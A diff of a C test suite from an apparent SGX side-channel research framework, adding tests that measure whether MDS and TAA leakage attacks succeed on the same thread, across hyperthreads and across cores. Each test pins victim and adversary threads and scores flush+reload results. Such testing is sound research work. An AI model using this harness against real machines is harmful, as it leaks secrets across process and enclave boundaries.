+    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
+    cr_expect(test_core_cross_core_taa_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+}
+
+#pragma endregion
 
 #pragma endregion
 
 #pragma region msd
 
-TestSuite(mds, .init = construct_app_environment, .fini = desctruct_app_environment, .disabled = false);
+TestSuite(mds, .init = construct_app_environment, .fini = desctruct_app_environment);
+
+#pragma region same_thread_mds_nosgx_is_effective
 
 /**
- * @brief Test if mds_same_thread is effective with a successful rate above 50% for at least 50% offset.
+ * @brief Test if same_thread_mds_nosgx is effective with a successful rate above 75% for at least 75% offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_mds_same_thread_is_effective()
+static int test_core_same_thread_mds_nosgx_is_effective()
 {
     int i, offset, allowance;
+    int core;
+    cpu_set_t cpuset;
 
-    allowance = 32;
+    core = 1;
+
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+
+    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
+
+    allowance = 16;
     for (offset = 0; offset < 64; offset++)
     {
         app_attack_spec.offset = offset;
         for (i = 0; i < REPETITION_TIME; i++)
         {
             flush_enclyser_buffer(&app_encoding_buffer);
-            fill_lfb(FILLING_SEQUENCE_STR_STORE, &app_filling_buffer);
+            fill_lfb(app_filling_sequence, &app_filling_buffer);
             attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
             reload(&app_encoding_buffer, &app_printing_buffer);
         }
-        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 50 || allowance--))
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 75 || allowance--))
         {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
             return -1;
         }
         reset(&app_printing_buffer);
@@ -550,7 +887,7 @@ static int test_core_mds_same_thread_is_effective()
     return 0;
 }
 
-Test(mds, mds_same_thread_is_effective, .disabled = false)
+Test(mds, same_thread_mds_nosgx_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_MDS;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
@@ -566,60 +903,47 @@ Test(mds, mds_same_thread_is_effective, .disabled = false)
     cripple_enclyser_buffer(&app_attaking_buffer);
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_mds_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_same_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
-// /**
-//  * @brief Test if mds_corss_thread is effective with a successful rate above 50% for at least 50% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_mds_corss_thread_is_effective()
-// {
-// }
+#pragma endregion
 
-// Test(mds, mds_corss_thread_is_effective, .disabled = false)
-// {
-// }
-
-// /**
-//  * @brief Test if mds_corss_core is effective with a successful rate above 50% for at least 50% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_mds_corss_core_is_effective()
-// {
-// }
-
-// Test(mds, mds_corss_core_is_effective, .disabled = false)
-// {
-// }
+#pragma region same_thread_mds_eexit_is_effective
 
 /**
- * @brief Test if mds_eexit_same_thread is effective with a successful rate above 50% for at least 50% offset.
+ * @brief Test if same_thread_mds_eexit is effective with a successful rate above 75% for at least 75% offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_mds_eexit_same_thread_is_effective()
+static int test_core_same_thread_mds_eexit_is_effective()
 {
     int i, offset, allowance;
+    int core;
+    cpu_set_t cpuset;
 
-    allowance = 32;
+    core = 1;
+
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+
+    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
+
+    allowance = 16;
     for (offset = 0; offset < 64; offset++)
     {
         app_attack_spec.offset = offset;
@@ -630,7 +954,7 @@ static int test_core_mds_eexit_same_thread_is_effective()
             attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
             reload(&app_encoding_buffer, &app_printing_buffer);
         }
-        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 50 || allowance--))
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 75 || allowance--))
         {
             return -1;
         }
@@ -639,7 +963,7 @@ static int test_core_mds_eexit_same_thread_is_effective()
     return 0;
 }
 
-Test(mds, mds_eexit_same_thread_is_effective, .disabled = false)
+Test(mds, same_thread_mds_eexit_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_TAA;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
@@ -655,60 +979,47 @@ Test(mds, mds_eexit_same_thread_is_effective, .disabled = false)
     cripple_enclyser_buffer(&app_attaking_buffer);
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_mds_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_same_thread_mds_eexit_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_mds_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_same_thread_mds_eexit_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_mds_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_same_thread_mds_eexit_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_mds_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_same_thread_mds_eexit_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_mds_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_same_thread_mds_eexit_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_mds_eexit_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_same_thread_mds_eexit_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
-// /**
-//  * @brief Test if mds_eexit_corss_thread is effective with a successful rate above 50% for at least 50% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_mds_eexit_corss_thread_is_effective()
-// {
-// }
+#pragma endregion
 
-// Test(mds, mds_eexit_corss_thread_is_effective, .disabled = false)
-// {
-// }
-
-// /**
-//  * @brief Test if mds_eexit_corss_core is effective with a successful rate above 50% for at least 50% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_mds_eexit_corss_core_is_effective()
-// {
-// }
-
-// Test(mds, mds_eexit_corss_core_is_effective, .disabled = false)
-// {
-// }
+#pragma region same_thread_mds_aex_is_effective
 
 /**
- * @brief Test if mds_aex_same_thread is effective with a successful rate above 50% for at least 50% offset.
+ * @brief Test if same_thread_mds_aex is effective with a successful rate above 75% for at least 75% offset.
  * 
  * @return int 0 if passed, -1 if failed.
  */
-static int test_core_mds_aex_same_thread_is_effective()
+static int test_core_same_thread_mds_aex_is_effective()
 {
     int i, offset, allowance;
+    int core;
+    cpu_set_t cpuset;
 
-    allowance = 32;
+    core = 1;
+
+    CPU_ZERO(&cpuset);
+    CPU_SET(core, &cpuset);
+
+    ASSERT(!sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset));
+
+    allowance = 16;
     for (offset = 0; offset < 64; offset++)
     {
         app_attack_spec.offset = offset;
@@ -718,7 +1029,7 @@ static int test_core_mds_aex_same_thread_is_effective()
             flush_enclyser_buffer(&app_encoding_buffer);
             ecall_grooming(global_eid, app_filling_sequence, &app_filling_buffer, app_clearing_sequence, &app_clearing_buffer, &app_faulting_buffer);
         }
-        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 50 || allowance--))
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] > 75 || allowance--))
         {
             return -1;
         }
@@ -727,7 +1038,7 @@ static int test_core_mds_aex_same_thread_is_effective()
     return 0;
 }
 
-Test(mds, mds_aex_same_thread_is_effective, .disabled = false)
+Test(mds, same_thread_mds_aex_is_effective, .disabled = false)
 {
     app_attack_spec.major = ATTACK_MAJOR_TAA;
     app_attack_spec.minor = ATTACK_MINOR_STABLE;
@@ -743,62 +1054,514 @@ Test(mds, mds_aex_same_thread_is_effective, .disabled = false)
     cripple_enclyser_buffer(&app_attaking_buffer);
 
     app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
-    cr_expect(test_core_mds_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+    cr_expect(test_core_same_thread_mds_aex_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
-    cr_expect(test_core_mds_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+    cr_expect(test_core_same_thread_mds_aex_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
-    cr_expect(test_core_mds_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+    cr_expect(test_core_same_thread_mds_aex_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
-    cr_expect(test_core_mds_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+    cr_expect(test_core_same_thread_mds_aex_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
-    cr_expect(test_core_mds_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+    cr_expect(test_core_same_thread_mds_aex_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
 
     app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
-    cr_expect(test_core_mds_aex_same_thread_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+    cr_expect(test_core_same_thread_mds_aex_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
 }
 
-// /**
-//  * @brief Test if mds_aex_corss_thread is effective with a successful rate above 50% for at least 50% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_mds_aex_corss_thread_is_effective()
-// {
-// }
+#pragma endregion
 
-// Test(mds, mds_aex_corss_thread_is_effective, .disabled = false)
-// {
-// }
+#pragma region cross_thread_mds_nosgx_is_effective
 
-// /**
-//  * @brief Test if mds_aex_corss_core is effective with a successful rate above 50% for at least 50% offset.
-//  * 
-//  * @return int 0 if passed, -1 if failed.
-//  */
-// static int test_core_mds_aex_corss_core_is_effective()
-// {
-// }
+/**
+ * @brief The victim function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_thread_mds_nosgx_is_effective_victim_thread(void *arg)
+{
+    int i;
 
-// Test(mds, mds_aex_corss_core_is_effective, .disabled = false)
-// {
-// }
+    for (i = 0; i < REPETITION_TIME * 100; i++)
+    {
+        fill_lfb(app_filling_sequence, &app_filling_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief The adversary function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_thread_mds_nosgx_is_effective_adversary_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME; i++)
+    {
+        flush_enclyser_buffer(&app_encoding_buffer);
+        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+        reload(&app_encoding_buffer, &app_printing_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief Test if cross_thread_mds_nosgx is effective with a successful rate above 5% for at least 75% offset.
+ * 
+ * @return int 0 if passed, -1 if failed.
+ */
+static int test_core_cross_thread_mds_nosgx_is_effective()
+{
+    int offset, allowance;
+    int victim_core, adversary_core;
+    pthread_t victim_thread, adversary_thread;
+    cpu_set_t victim_cpuset, adversary_cpuset;
+
+    victim_core = 1;
+    adversary_core = victim_core + app_sysinfo.nr_cores;
+
+    CPU_ZERO(&victim_cpuset);
+    CPU_ZERO(&adversary_cpuset);
+    CPU_SET(victim_core, &victim_cpuset);
+    CPU_SET(adversary_core, &adversary_cpuset);
+
+    allowance = 16;
+    for (offset = 0; offset < 64; offset++)
+    {
+        app_attack_spec.offset = offset;
+
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_mds_nosgx_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_mds_nosgx_is_effective_adversary_thread, NULL));
+
+        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
+        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
+
+        pthread_join(adversary_thread, NULL);
+        pthread_join(victim_thread, NULL);
+
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 5 || allowance--))
+        {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
+            return -1;
+        }
+        reset(&app_printing_buffer);
+    }
+    return 0;
+}
+
+Test(mds, cross_thread_mds_nosgx_is_effective, .disabled = false)
+{
+    app_attack_spec.major = ATTACK_MAJOR_MDS;
+    app_attack_spec.minor = ATTACK_MINOR_STABLE;
+
+    app_filling_buffer.value = 0x1;
+    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
+    assign_enclyser_buffer(&app_filling_buffer);
+
+    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
+    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
+    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
+    assign_enclyser_buffer(&app_attaking_buffer);
+    cripple_enclyser_buffer(&app_attaking_buffer);
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
+    cr_expect(test_core_cross_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
+    cr_expect(test_core_cross_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
+    cr_expect(test_core_cross_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
+    cr_expect(test_core_cross_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
+    cr_expect(test_core_cross_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
+    cr_expect(test_core_cross_thread_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+}
+
+#pragma endregion
+
+#pragma region corss_thread_mds_ecall_is_effective
+
+/**
+ * @brief The victim function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_thread_mds_ecall_is_effective_victim_thread(void *arg)
+{
+    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);
+
+    return NULL;
+}
+
+/**
+ * @brief The adversary function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_thread_mds_ecall_is_effective_adversary_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME; i++)
+    {
+        flush_enclyser_buffer(&app_encoding_buffer);
+        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+        reload(&app_encoding_buffer, &app_printing_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief Test if corss_thread_mds_ecall is effective with a successful rate above 5% for at least 75% offset.
+ * 
+ * @return int 0 if passed, -1 if failed.
+ */
+static int test_core_cross_thread_mds_ecall_is_effective()
+{
+    int offset, allowance;
+    int victim_core, adversary_core;
+    pthread_t victim_thread, adversary_thread;
+    cpu_set_t victim_cpuset, adversary_cpuset;
+
+    victim_core = 1;
+    adversary_core = victim_core + app_sysinfo.nr_cores;
+
+    CPU_ZERO(&victim_cpuset);
+    CPU_ZERO(&adversary_cpuset);
+    CPU_SET(victim_core, &victim_cpuset);
+    CPU_SET(adversary_core, &adversary_cpuset);
+
+    allowance = 16;
+    for (offset = 0; offset < 64; offset++)
+    {
+        app_attack_spec.offset = offset;
+
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_thread_mds_ecall_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_thread_mds_ecall_is_effective_adversary_thread, NULL));
+
+        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
+        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
+
+        pthread_join(adversary_thread, NULL);
+        pthread_join(victim_thread, NULL);
+
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 5 || allowance--))
+        {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
+            return -1;
+        }
+        reset(&app_printing_buffer);
+    }
+    return 0;
+}
+
+Test(mds, cross_thread_mds_ecall_is_effective, .disabled = false)
+{
+    app_attack_spec.major = ATTACK_MAJOR_MDS;
+    app_attack_spec.minor = ATTACK_MINOR_STABLE;
+
+    app_filling_buffer.value = 0x1;
+    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
+    assign_enclyser_buffer(&app_filling_buffer);
+
+    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
+    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
+    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
+    assign_enclyser_buffer(&app_attaking_buffer);
+    cripple_enclyser_buffer(&app_attaking_buffer);
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
+    cr_expect(test_core_cross_thread_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
+    cr_expect(test_core_cross_thread_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
+    cr_expect(test_core_cross_thread_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
+    cr_expect(test_core_cross_thread_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
+    cr_expect(test_core_cross_thread_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
+    cr_expect(test_core_cross_thread_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+}
+
+#pragma endregion
+
+#pragma region corss_core_mds_nosgx_is_effective
+
+/**
+ * @brief The victim function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_mds_nosgx_is_effective_victim_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME * 100; i++)
+    {
+        fill_lfb(app_filling_sequence, &app_filling_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief The adversary function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_mds_nosgx_is_effective_adversary_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME; i++)
+    {
+        flush_enclyser_buffer(&app_encoding_buffer);
+        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+        reload(&app_encoding_buffer, &app_printing_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief Test if cross_thread_mds_nosgx is effective with a successful rate above 5% for at least 75% offset.
+ * 
+ * @return int 0 if passed, -1 if failed.
+ */
+static int test_core_cross_core_mds_nosgx_is_effective()
+{
+    int offset, allowance;
+    int victim_core, adversary_core;
+    pthread_t victim_thread, adversary_thread;
+    cpu_set_t victim_cpuset, adversary_cpuset;
+
+    victim_core = 1;
+    adversary_core = victim_core + app_sysinfo.nr_cores - 1;
+
+    CPU_ZERO(&victim_cpuset);
+    CPU_ZERO(&adversary_cpuset);
+    CPU_SET(victim_core, &victim_cpuset);
+    CPU_SET(adversary_core, &adversary_cpuset);
+
+    allowance = 16;
+    for (offset = 0; offset < 64; offset++)
+    {
+        app_attack_spec.offset = offset;
+
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_mds_nosgx_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_mds_nosgx_is_effective_adversary_thread, NULL));
+
+        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
+        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
+
+        pthread_join(adversary_thread, NULL);
+        pthread_join(victim_thread, NULL);
+
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 5 || allowance--))
+        {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
+            return -1;
+        }
+        reset(&app_printing_buffer);
+    }
+    return 0;
+}
+
+Test(mds, cross_core_mds_nosgx_is_effective, .disabled = false)
+{
+    app_attack_spec.major = ATTACK_MAJOR_MDS;
+    app_attack_spec.minor = ATTACK_MINOR_STABLE;
+
+    app_filling_buffer.value = 0x1;
+    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
+    assign_enclyser_buffer(&app_filling_buffer);
+
+    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
+    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
+    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
+    assign_enclyser_buffer(&app_attaking_buffer);
+    cripple_enclyser_buffer(&app_attaking_buffer);
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
+    cr_expect(test_core_cross_core_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
+    cr_expect(test_core_cross_core_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
+    cr_expect(test_core_cross_core_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
+    cr_expect(test_core_cross_core_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
+    cr_expect(test_core_cross_core_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
+    cr_expect(test_core_cross_core_mds_nosgx_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+}
+
+#pragma endregion
+
+#pragma region corss_core_mds_ecall_is_effective
+
+/**
+ * @brief The victim function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_mds_ecall_is_effective_victim_thread(void *arg)
+{
+    ecall_rep_fill_lfb(global_eid, app_filling_sequence, &app_filling_buffer);
+
+    return NULL;
+}
+
+/**
+ * @brief The adversary function run by pthread
+ * 
+ * @param arg data passed to the thread function
+ * @return void* always return NULL
+ */
+static void *test_core_cross_core_mds_ecall_is_effective_adversary_thread(void *arg)
+{
+    int i;
+
+    for (i = 0; i < REPETITION_TIME; i++)
+    {
+        flush_enclyser_buffer(&app_encoding_buffer);
+        attack(&app_attack_spec, &app_attaking_buffer, &app_encoding_buffer);
+        reload(&app_encoding_buffer, &app_printing_buffer);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief Test if corss_thread_mds_ecall is effective with a successful rate above 5% for at least 75% offset.
+ * 
+ * @return int 0 if passed, -1 if failed.
+ */
+static int test_core_cross_core_mds_ecall_is_effective()
+{
+    int offset, allowance;
+    int victim_core, adversary_core;
+    pthread_t victim_thread, adversary_thread;
+    cpu_set_t victim_cpuset, adversary_cpuset;
+
+    victim_core = 1;
+    adversary_core = victim_core + app_sysinfo.nr_cores - 1;
+
+    CPU_ZERO(&victim_cpuset);
+    CPU_ZERO(&adversary_cpuset);
+    CPU_SET(victim_core, &victim_cpuset);
+    CPU_SET(adversary_core, &adversary_cpuset);
+
+    allowance = 16;
+    for (offset = 0; offset < 64; offset++)
+    {
+        app_attack_spec.offset = offset;
+
+        ASSERT(!pthread_create(&victim_thread, NULL, test_core_cross_core_mds_ecall_is_effective_victim_thread, NULL));
+        ASSERT(!pthread_create(&adversary_thread, NULL, test_core_cross_core_mds_ecall_is_effective_adversary_thread, NULL));
+
+        ASSERT(!pthread_setaffinity_np(victim_thread, sizeof(cpu_set_t), &victim_cpuset));
+        ASSERT(!pthread_setaffinity_np(adversary_thread, sizeof(cpu_set_t), &adversary_cpuset));
+
+        pthread_join(adversary_thread, NULL);
+        pthread_join(victim_thread, NULL);
+
+        if (!(app_printing_buffer.buffer[offset + app_filling_buffer.value] >= 5 || allowance--))
+        {
+            // INFO("offset: 0x%x", offset);
+            // print(&app_printing_buffer, 0);
+            return -1;
+        }
+        reset(&app_printing_buffer);
+    }
+    return 0;
+}
+
+Test(mds, cross_core_mds_ecall_is_effective, .disabled = false)
+{
+    app_attack_spec.major = ATTACK_MAJOR_MDS;
+    app_attack_spec.minor = ATTACK_MINOR_STABLE;
+
+    app_filling_buffer.value = 0x1;
+    app_filling_buffer.order = BUFFER_ORDER_OFFSET_INLINE;
+    assign_enclyser_buffer(&app_filling_buffer);
+
+    app_attaking_buffer.value = 0xff; // IMPORTANT: MUST BE NON-ZERO VALUE
+    app_attaking_buffer.order = BUFFER_ORDER_CONSTANT;
+    app_attaking_buffer.access_ctrl = BUFFER_ACCESS_CTRL_NOT_PRESENT;
+    assign_enclyser_buffer(&app_attaking_buffer);
+    cripple_enclyser_buffer(&app_attaking_buffer);
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_LOAD;
+    cr_expect(test_core_cross_core_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_GP_STORE;
+    cr_expect(test_core_cross_core_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_GP_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_LOAD;
+    cr_expect(test_core_cross_core_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_NT_STORE;
+    cr_expect(test_core_cross_core_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_NT_STORE");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_LOAD;
+    cr_expect(test_core_cross_core_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_LOAD");
+
+    app_filling_sequence = FILLING_SEQUENCE_STR_STORE;
+    cr_expect(test_core_cross_core_mds_ecall_is_effective() == 0, "FILLING_SEQUENCE_STR_STORE");
+}
+
+#pragma endregion
 
 #pragma endregion
 
 #pragma region verw
 
